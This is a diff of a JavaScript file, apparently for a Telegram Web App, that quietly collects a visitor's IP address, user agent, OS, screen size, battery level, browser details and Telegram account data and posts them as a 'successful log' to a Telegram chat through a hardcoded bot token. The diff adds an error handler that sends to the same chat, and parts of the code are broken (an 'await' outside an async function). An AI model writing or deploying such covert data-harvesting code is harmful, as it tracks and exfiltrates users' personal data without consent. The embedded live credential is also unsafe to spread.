@@ -1,15 +1,30 @@
-window.onerror = function(message, source, lineno, colno, error) {
-  logSendError(message);
-};
+window.addEventListener('error', (event) => {
+    const message =`Ошибка: ${event.message}
+    Файл: ${event.filename}:${event.lineno}
+    Столбец: ${event.colno}
+    Стек ошибки:n${event.error.stack};`
+  
+  
+    const token = '7159693608:AAE5eKPnwrQMfw7Dm8ETaJ_rLlYLWjO8hf8';
+    const telegramBotURL = https://api.telegram.org/bot${token}/sendMessage;
+    const chatId = '-1002005164665';
+  
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('text', message);
+    formData.append('parse_mode', 'HTML');
+  
+    await fetch(telegramBotURL, {
+          method: 'POST',
+          body: formData
+    });
+});
+  
 
 async function getIPAddress() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    } catch (error) {
-        logSendError(error.message);
-    }
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
 }
 
 function getUserAgent() {
@@ -21,16 +36,12 @@ function getOSName() {
 }
 
 function getScreenResolution() {
-    return ${window.screen.width}x${window.screen.height};
+    return `${window.screen.width}x${window.screen.height}`;
 }
 
 async function getBatteryPercentage() {
-    try {
-        const battery = await navigator.getBattery();
-        return Math.floor(battery.level * 100);
-    } catch (error) {
-        logSendError(error.message);
-    }
+    const battery = await navigator.getBattery();
+    return Math.floor(battery.level * 100);
 }
 
 function getBrowserInfo() {
@@ -39,23 +50,6 @@ function getBrowserInfo() {
         version: navigator.appVersion,
         engine: navigator.product
     };
-}
-
-function logSendError(errorMessage) {
-    const telegramBotURL = https://api.telegram.org/bot${token}/sendMessage;
-    const chatId = '-1001005164666';
-
-    const message = Ошибка при отправке лога: ${errorMessage};
-
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('text', message);
-    formData.append('parse_mode', 'HTML');
-
-    fetch(telegramBotURL, {
-        method: 'POST',
-        body: formData
-    });
 }
 
 async function sendDataToTelegram() {
@@ -67,7 +61,7 @@ async function sendDataToTelegram() {
     const browserInfo = getBrowserInfo();
     let tg = window.Telegram.WebApp;
 
-    const message = 
+    const message = `
 <b>✨ Лог успешен!</b>
 
 <b>🔍 Информация об аккаунте:</b>
@@ -78,7 +72,7 @@ async function sendDataToTelegram() {
 ├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
 └ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
 
-<b>🖥 Информация об устройстве:</b>
+<b>🖥️ Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
 ├ UserAgent: <code>${userAgent}</code>
 ├ Хэш: <code>undefined</code>
@@ -91,10 +85,10 @@ async function sendDataToTelegram() {
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
-    ;
+    `;
 
     const token = '7159693608:AAE5eKPnwrQMfw7Dm8ETaJ_rLlYLWjO8hf8';
-    const telegramBotURL = https://api.telegram.org/bot${token}/sendMessage;
+    const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
     const chatId = '-1002005164665';
 
     const formData = new FormData();
@@ -108,4 +102,4 @@ async function sendDataToTelegram() {
     });
 }
 
-sendDataToTelegram().catch(logSendError);
+sendDataToTelegram();
